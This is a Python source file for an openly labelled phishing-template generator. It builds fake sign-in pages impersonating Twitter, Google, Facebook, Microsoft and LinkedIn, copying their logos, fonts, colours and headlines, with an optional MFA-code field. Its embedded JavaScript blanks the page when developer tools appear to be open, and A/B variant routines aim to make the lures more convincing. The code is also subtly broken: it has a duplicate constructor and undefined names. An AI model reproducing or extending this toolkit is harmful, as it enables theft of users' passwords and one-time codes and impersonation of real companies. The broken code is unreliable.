"""
Template Generator - Intelligent Template Creation
==============================================

Generates optimized phishing templates:
- Dynamic content generation
- Personalization engine
- Responsive design adaptation
- Performance optimization
- Compliance checking
"""

import json
import random
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from jinja2 import Environment, Template, select_autoescape
import re


@dataclass
class TemplateConfig:
    """Template generation configuration"""
    target_platform: str
    template_type: str  # login, register, payment, etc.
    personalization_level: str  # low, medium, high
    responsive: bool
    optimization_level: str  # basic, advanced, maximum
    compliance_checks: List[str]
    custom_variables: Dict[str, Any]


@dataclass
class GeneratedTemplate:
    """Generated template with metadata"""
    template_id: str
    name: str
    description: str
    html_content: str
    css_content: str
    js_content: str
    config: TemplateConfig
    performance_score: float
    compliance_score: float
    created_at: datetime
    variables_used: List[str]


class TemplateGenerator:
    """
    Intelligent template generation system.
    Creates optimized phishing templates with personalization and A/B testing support.
    """
    
    def __init__(self):
        self.env = Environment(
            loader=select_autoescape(['html', 'xml', 'jinja2']),
            autoescape=True
        )
        
        # Template templates
        self.base_templates = {
            'login': {
                'html': '''
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>{{ css_content }}</style>
    <script>{{ js_content }}</script>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">
                <img src="{{ logo_url }}" alt="{{ company_name }}" />
            </div>
        </header>
        
        <main class="main">
            <div class="form-container">
                <h1>{{ headline }}</h1>
                <p class="subtitle">{{ subtitle }}</p>
                
                <form id="login-form" method="post" action="{{ action_url }}">
                    <div class="form-group">
                        <label for="username">{{ username_label }}</label>
                        <input type="text" id="username" name="username" placeholder="{{ username_placeholder }}" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">{{ password_label }}</label>
                        <input type="password" id="password" name="password" placeholder="{{ password_placeholder }}" required>
                    </div>
                    
                    {% if show_mfa %}
                    <div class="form-group">
                        <label for="mfa_code">{{ mfa_label }}</label>
                        <input type="text" id="mfa_code" name="mfa_code" placeholder="{{ mfa_placeholder }}">
                    </div>
                    {% endif %}
                    
                    <button type="submit" class="btn btn-primary">{{ submit_text }}</button>
                </form>
            </div>
        </main>
        
        <footer class="footer">
            <p>{{ footer_text }}</p>
        </footer>
    </div>
</body>
</html>
                ''',
                'css': '''
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: {{ font_family }}, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: {{ background_color }};
    color: {{ text_color }};
    line-height: 1.6;
}

.container {
    max-width: {{ container_width }};
    margin: 0 auto;
    padding: 20px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.header {
    text-align: center;
    margin-bottom: 40px;
}

.logo img {
    max-width: {{ logo_max_width }};
    height: auto;
}

.main {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
}

.form-container {
    background: {{ form_bg_color }};
    padding: {{ form_padding }};
    border-radius: {{ border_radius }};
    box-shadow: {{ box_shadow }};
    width: 100%;
    max-width: {{ form_max_width }};
}

h1 {
    color: {{ heading_color }};
    font-size: {{ heading_size }};
    margin-bottom: 16px;
    text-align: center;
}

.subtitle {
    color: {{ subtitle_color }};
    text-align: center;
    margin-bottom: 32px;
}

.form-group {
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: 600;
    color: {{ label_color }};
}

input {
    width: 100%;
    padding: 12px;
    border: 1px solid {{ border_color }};
    border-radius: 4px;
    font-size: 16px;
    transition: border-color 0.3s ease;
}

input:focus {
    outline: none;
    border-color: {{ focus_color }};
}

.btn {
    width: 100%;
    padding: 12px 24px;
    border: none;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.btn-primary {
    background: {{ primary_color }};
    color: white;
}

.btn-primary:hover {
    background: {{ primary_hover_color }};
}

.footer {
    text-align: center;
    margin-top: 40px;
    font-size: 14px;
    color: {{ footer_color }};
}

/* Responsive Design */
@media (max-width: 768px) {
    .container {
        padding: 10px;
    }
    
    .form-container {
        padding: 20px;
    }
    
    h1 {
        font-size: 24px;
    }
}
                ''',
                'js': '''
// Anti-debugging and sandbox detection
(function() {
    // Check for devtools
    var devtools = /./;
    var devtools_open = false;
    
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > 200 || 
            window.outerWidth - window.innerWidth > 200) {
            if (!devtools_open) {
                devtools_open = true;
                document.body.innerHTML = '';
                window.location.href = 'about:blank';
            }
        } else {
            devtools_open = false;
        }
    }, 500);
    
    // Form validation and interaction
    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Collect form data
        const formData = new FormData(this);
        const data = {};
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // Validate
        if (!data.username || !data.password) {
            alert('Please fill in all required fields');
            return;
        }
        
        // Simulate submission
        console.log('Form data:', data);
        
        // Show loading state
        const submitBtn = this.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';
        
        // Simulate API call
        setTimeout(function() {
            submitBtn.disabled = false;
            submitBtn.textContent = '{{ submit_text }}';
            // Handle success/error
        }, 2000);
    });
    
    // Auto-focus on username field
    setTimeout(function() {
        document.getElementById('username').focus();
    }, 100);
    
    // Add input animations
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('focused');
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.classList.remove('focused');
        });
    });
})();
                '''
            }
        }
    
    def __init__(self):
        self.template_cache = {}
        self.performance_metrics = {}
    
    def generate_template(self, config: TemplateConfig) -> GeneratedTemplate:
        """Generate an optimized template based on configuration"""
        template_id = f"template_{int(time.time())}_{random.randint(1000, 9999)}"
        
        # Generate template variables
        variables = self._generate_template_variables(config)
        
        # Render HTML
        html_template = self.env.from_string(self.base_templates[config.template_type]['html'])
        html_content = html_template.render(**variables)
        
        # Generate CSS
        css_template = self.env.from_string(self.base_templates[config.template_type]['css'])
        css_content = css_template.render(**variables)
        
        # Generate JavaScript
        js_template = self.env.from_string(self.base_templates[config.template_type]['js'])
        js_content = js_template.render(**variables)
        
        # Calculate scores
        performance_score = self._calculate_performance_score(config)
        compliance_score = self._calculate_compliance_score(config, html_content, css_content, js_content)
        
        return GeneratedTemplate(
            template_id=template_id,
            name=f"{config.target_platform.title()} {config.template_type.title()} Template",
            description=f"Generated template for {config.target_platform} with {config.template_type} functionality",
            html_content=html_content,
            css_content=css_content,
            js_content=js_content,
            config=config,
            performance_score=performance_score,
            compliance_score=compliance_score,
            created_at=datetime.now(),
            variables_used=list(variables.keys())
        )
    
    def _generate_template_variables(self, config: TemplateConfig) -> Dict[str, Any]:
        """Generate template variables based on configuration"""
        base_variables = {
            'lang': 'en',
            'title': f'{config.target_platform} - Sign In',
            'company_name': config.target_platform,
            'logo_url': f'https://logo.clearbit.com/{config.target_platform.lower()}.png',
            'headline': self._generate_headline(config),
            'subtitle': self._generate_subtitle(config),
            'username_label': 'Email or username',
            'password_label': 'Password',
            'username_placeholder': 'Enter your email or username',
            'password_placeholder': 'Enter your password',
            'submit_text': 'Sign In',
            'action_url': '/login',
            'show_mfa': config.template_type == 'login' and config.personalization_level in ['medium', 'high'],
            'mfa_label': 'Verification Code',
            'mfa_placeholder': 'Enter 6-digit code',
            'footer_text': f'© 2024 {config.target_platform}. All rights reserved.',
            
            # Styling variables
            'font_family': self._get_font_family(config),
            'background_color': self._get_background_color(config),
            'text_color': self._get_text_color(config),
            'form_bg_color': '#ffffff',
            'border_color': '#ddd',
            'focus_color': '#007bff',
            'heading_color': '#333',
            'subtitle_color': '#666',
            'label_color': '#555',
            'primary_color': self._get_primary_color(config),
            'primary_hover_color': self._get_primary_hover_color(config),
            'footer_color': '#999',
            'container_width': '400px',
            'form_max_width': '400px',
            'form_padding': '40px',
            'border_radius': '8px',
            'box_shadow': '0 4px 6px rgba(0, 0, 0, 0.1)',
            'heading_size': '28px',
            'logo_max_width': '200px'
        }
        
        # Add personalization variables
        if config.personalization_level == 'medium':
            base_variables.update({
                'username_placeholder': f'Enter your {config.target_platform} email',
                'submit_text': f'Sign in to {config.target_platform}'
            })
        elif config.personalization_level == 'high':
            base_variables.update({
                'headline': f'Welcome back! Sign in to your {config.target_platform} account',
                'subtitle': f'Access your {config.target_platform} account to continue',
                'username_placeholder': f'Enter your {config.target_platform} email address',
                'submit_text': f'Sign in to {config.target_platform}'
            })
        
        # Add optimization variables
        if config.optimization_level == 'advanced':
            base_variables.update({
                'border_radius': '12px',
                'box_shadow': '0 8px 16px rgba(0, 0, 0, 0.15)',
                'form_padding': '48px'
            })
        elif config.optimization_level == 'maximum':
            base_variables.update({
                'border_radius': '16px',
                'box_shadow': '0 12px 24px rgba(0, 0, 0, 0.2)',
                'form_padding': '60px',
                'heading_size': '32px'
            })
        
        # Add custom variables
        base_variables.update(config.custom_variables)
        
        return base_variables
    
    def _generate_headline(self, config: TemplateConfig) -> str:
        """Generate headline based on platform and personalization"""
        headlines = {
            'twitter': [
                'Sign in to Twitter',
                'Welcome back to Twitter',
                'Connect with your Twitter account'
            ],
            'google': [
                'Sign in to Google',
                'Welcome to Google',
                'Access your Google Account'
            ],
            'facebook': [
                'Log in to Facebook',
                'Welcome back to Facebook',
                'Connect with friends and family'
            ],
            'microsoft': [
                'Sign in to Microsoft',
                'Welcome to Microsoft 365',
                'Access your Microsoft account'
            ],
            'linkedin': [
                'Sign in to LinkedIn',
                'Welcome back to LinkedIn',
                'Connect with professionals'
            ]
        }
        
        platform_headlines = headlines.get(config.target_platform.lower(), ['Sign in'])
        
        if config.personalization_level == 'high':
            return platform_headlines[2] if len(platform_headlines) > 2 else platform_headlines[0]
        elif config.personalization_level == 'medium':
            return platform_headlines[1] if len(platform_headlines) > 1 else platform_headlines[0]
        else:
            return platform_headlines[0]
    
    def _generate_subtitle(self, config: TemplateConfig) -> str:
        """Generate subtitle based on platform and personalization"""
        subtitles = {
            'twitter': [
                'See what\'s happening in the world right now',
                'Join the conversation',
                'Connect with your friends and other interesting people'
            ],
            'google': [
                'One account. All of Google.',
                'Sign in to continue to Google',
                'Access your Google services'
            ],
            'facebook': [
                'Connect with friends and the world around you',
                'Share what\'s on your mind',
                'Connect with friends and family'
            ],
            'microsoft': [
                'Email, calendar, and more in one place',
                'Work or school account',
                'Access your Microsoft services'
            ],
            'linkedin': [
                'Connect with professionals',
                'Build your professional network',
                'Find opportunities'
            ]
        }
        
        platform_subtitles = subtitles.get(config.target_platform.lower(), ['Sign in to continue'])
        
        if config.personalization_level == 'high':
            return platform_subtitles[2] if len(platform_subtitles) > 2 else platform_subtitles[0]
        elif config.personalization_level == 'medium':
            return platform_subtitles[1] if len(platform_subtitles) > 1 else platform_subtitles[0]
        else:
            return platform_subtitles[0]
    
    def _get_font_family(self, config: TemplateConfig) -> str:
        """Get font family based on platform"""
        font_families = {
            'twitter': 'TwitterChaaps, system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
            'google': 'Roboto, arial, sans-serif',
            'facebook': 'Helvetica, Arial, sans-serif',
            'microsoft': 'Segoe UI, Tahoma, Geneva, Verdana, sans-serif',
            'linkedin': 'LinkedIn System UI, -apple-system, BlinkMacSystemFont, sans-serif'
        }
        
        return font_families.get(config.target_platform.lower(), 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif')
    
    def _get_background_color(self, config: Config) -> str:
        """Get background color based on platform"""
        colors = {
            'twitter': '#1DA1F2',
            'google': '#f8f9fa',
            'facebook': '#f0f2f5',
            'microsoft': '#f3f2f1',
            'linkedin': '#f3f2f1'
        }
        
        return colors.get(config.target_platform.lower(), '#ffffff')
    
    def _get_text_color(self, config: Config) -> str:
        """Get text color based on platform"""
        text_colors = {
            'twitter': '#ffffff',
            'google': '#202124',
            'facebook': '#1c1e21',
            'microsoft': '#323130',
            'linkedin': '#323130'
        }
        
        return text_colors.get(config.target_platform.lower(), '#333333')
    
    def _get_primary_color(self, config: Config) -> str:
        """Get primary color based on platform"""
        primary_colors = {
            'twitter': '#1DA1F2',
            'google': '#4285F4',
            'facebook': '#1877F2',
            'microsoft': '#0078D4',
            'linkedin': '#0077B5'
        }
        
        return primary_colors.get(config.target_platform.lower(), '#007bff')
    
    def _get_primary_hover_color(self, config: Config) -> str:
        """Get primary hover color based on platform"""
        hover_colors = {
            'twitter': '#1a91da',
            'google': '#357ae8',
            'facebook': '#1665d9',
            'microsoft': '#0056b3',
            'linkedin': '#005885'
        }
        
        return hover_colors.get(config.target_platform.lower(), '#0056b3')
    
    def _calculate_performance_score(self, config: TemplateConfig) -> float:
        """Calculate performance score based on configuration"""
        score = 0.0
        
        # Base score
        score += 0.3
        
        # Personalization score
        if config.personalization_level == 'medium':
            score += 0.2
        elif config.personalization_level == 'high':
            score += 0.4
        
        # Responsive design
        if config.responsive:
            score += 0.1
        
        # Optimization level
        if config.optimization_level == 'advanced':
            score += 0.2
        elif config.optimization_level == 'maximum':
            score += 0.3
        
        # Compliance checks
        if config.compliance_checks:
            score += 0.1
        
        return min(score, 1.0)
    
    def _calculate_compliance_score(self, config: TemplateConfig, html: str, css: str, js: str) -> float:
        """Calculate compliance score based on checks"""
        score = 1.0
        
        # Check for common compliance issues
        compliance_issues = [
            ('password_field', 'type="password"' in html),
            ('https_links', 'https://' in html),
            ('no_inline_scripts', '<script>' not in html or 'type="text/javascript"' not in html),
            ('meta_viewport', 'viewport' in html),
            ('form_validation', 'required' in html),
            ('ssl_redirect', 'https://' in html),
            ('no_eval', 'eval(' not in js),
            ('no_innerHTML', 'innerHTML' not in js),
            ('no_document_write', 'document.write' not in js)
        ]
        
        for issue, check in compliance_issues:
            if not check:
                score -= 0.1
        
        # Check for custom compliance requirements
        for check in config.compliance_checks:
            if check == 'gdpr' and 'privacy' not in html.lower():
                score -= 0.1
            elif check == 'accessibility' and 'aria-' not in html:
                score -= 0.1
            elif check == 'performance' and 'async' not in html:
                score -= 0.1
        
        return max(score, 0.0)
    
    def batch_generate_templates(self, configs: List[TemplateConfig]) -> List[GeneratedTemplate]:
        """Generate multiple templates"""
        templates = []
        
        for config in configs:
            try:
                template = self.generate_template(config)
                templates.append(template)
            except Exception as e:
                print(f"Error generating template for {config.target_platform}: {e}")
        
        return templates
    
    def optimize_template(self, template: GeneratedTemplate) -> GeneratedTemplate:
        """Optimize an existing template for better performance"""
        # Minify CSS
        template.css_content = self._minify_css(template.css_content)
        
        # Minify JavaScript
        template.js_content = self._minify_js(template.js_content)
        
        # Update performance score
        template.performance_score = min(template.performance_score + 0.1, 1.0)
        
        return template
    
    def _minify_css(self, css: str) -> str:
        """Simple CSS minification"""
        # Remove comments and extra whitespace
        css = re.sub(r'/\*.*?\*/', '', css, flags=re.DOTALL)
        css = re.sub(r'\s+', ' ', css)
        css = re.sub(r';\s*}', ';', css)
        
        return css.strip()
    
    def _minify_js(self, js: str) -> str:
        """Simple JavaScript minification"""
        # Remove comments and extra whitespace
        js = re.sub(r'//.*$', '', js, flags=re.MULTILINE)
        js = re.sub(r'/\*.*?\*/', '', js, flags=re.DOTALL)
        js = re.sub(r'\s+', ' ', js)
        js = re.sub(r';\s*}', ';', js)
        
        return js.strip()
    
    def _apply_optimization(self, content: str, level: str) -> str:
        """Apply performance optimization"""
        if level == "basic":
            # Simple whitespace removal
            return re.sub(r'\s+', ' ', content)
            
        elif level == "advanced":
            # Minification + Comment removal
            content = re.sub(r'<!--.*?-->', '', content, flags=re.DOTALL)
            content = re.sub(r'\s+', ' ', content)
            return content.strip()
            
        elif level == "maximum":
            # Aggressive optimization for mobile/4G networks
            # - Remove comments
            # - Minify whitespace
            # - Inline critical CSS/JS
            # - Add preconnect headers
            content = re.sub(r'<!--.*?-->', '', content, flags=re.DOTALL)
            content = re.sub(r'\s+', ' ', content)
            
            # Add performance meta tags
            perf_headers = """
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://cdnjs.cloudflare.com">
            <meta http-equiv="x-dns-prefetch-control" content="on">
            """
            content = content.replace('<head>', f'<head>{perf_headers}')
            
            return content.strip()
            
        return content
    
    def get_template_variations(self, base_template: GeneratedTemplate, 
                             variations: List[str] = None) -> List[GeneratedTemplate]:
        """Generate variations of a template for A/B testing"""
        if variations is None:
            variations = ['headline', 'colors', 'layout', 'form_style']
        
        template_variations = [base_template]
        
        for variation in variations:
            try:
                # Create variation config
                var_config = TemplateConfig(
                    target_platform=base_template.config.target_platform,
                    template_type=base_template.config.template_type,
                    personalization_level=base_template.config.personalization_level,
                    responsive=base_template.config.responsive,
                    optimization_level=base_template.config.optimization_level,
                    compliance_checks=base_template.config.compliance_checks,
                    custom_variables={}
                )
                
                # Apply variation
                if variation == 'headline':
                    var_config.custom_variables['headline'] = self._generate_alternative_headline(base_template.config.target_platform)
                elif variation == 'colors':
                    var_config.custom_variables.update(self._generate_color_variations(base_template.config.target_platform))
                elif variation == 'layout':
                    var_config.custom_variables.update(self._generate_layout_variations())
                elif variation == 'form_style':
                    var_config.custom_variables.update(self._generate_form_style_variations())
                
                # Generate variation
                variant_template = self.generate_template(var_config)
                template_variations.append(variant_template)
                
            except Exception as e:
                print(f"Error generating variation '{variation}': {e}")
        
        return template_variations
    
    def _generate_alternative_headline(self, platform: str) -> str:
        """Generate alternative headlines for A/B testing"""
        alternatives = {
            'twitter': [
                'Connect with your Twitter community',
                'Join the conversation on Twitter',
                'Share your thoughts on Twitter'
            ],
            'google': [
                'Access your Google services',
                'Sign in to your Google Account',
                'Continue to Google'
            ],
            'facebook': [
                'Connect with friends on Facebook',
                'Share your life on Facebook',
                'Find friends on Facebook'
            ],
            'microsoft': [
                'Access your Microsoft services',
                'Sign in to Microsoft 365',
                'Continue to Microsoft'
            ],
            'linkedin': [
                'Build your professional network',
                'Connect with professionals',
                'Advance your career on LinkedIn'
            ]
        }
        
        platform_alternatives = alternatives.get(platform.lower(), [])
        return random.choice(platform_alternatives) if platform_alternatives else "Sign in to continue"
    
    def _generate_color_variations(self, platform: str) -> Dict[str, str]:
        """Generate color variations for A/B testing"""
        color_schemes = {
            'twitter': {
                'primary_color': '#14171A',
                'background_color': '#000000',
                'text_color': '#E1E8ED'
            },
            'google': {
                'primary_color': '#EA4335',
                'background_color': '#FFFFFF',
                'text_color': '#202124'
            },
            'facebook': {
                'primary_color': '#8B9DC3',
                'background_color': '#FFFFFF',
                'text_color': '#1C1E21'
            },
            'microsoft': {
                'primary_color': '#00BCF2',
                'background_color': '#FFFFFF',
                'text_color': '#323130'
            },
            'linkedin': {
                'primary_color': '#0A66C2',
                'background_color': '#FFFFFF',
                'text_color': '#323130'
            }
        }
        
        return color_schemes.get(platform.lower(), {})
    
    def _generate_layout_variations(self) -> Dict[str, str]:
        """Generate layout variations for A/B testing"""
        return {
            'form_max_width': '480px',
            'form_padding': '32px',
            'border_radius': '6px',
            'box_shadow': '0 2px 4px rgba(0, 0, 0, 0.1)'
        }
    
    def _generate_form_style_variations(self) -> Dict[str, str]:
        """Generate form style variations for A/B testing"""
        return {
            'border_color': '#ccc',
            'focus_color': '#66afe9',
            'primary_color': '#5cb85c',
            'primary_hover_color': '#4cae4c'
        }
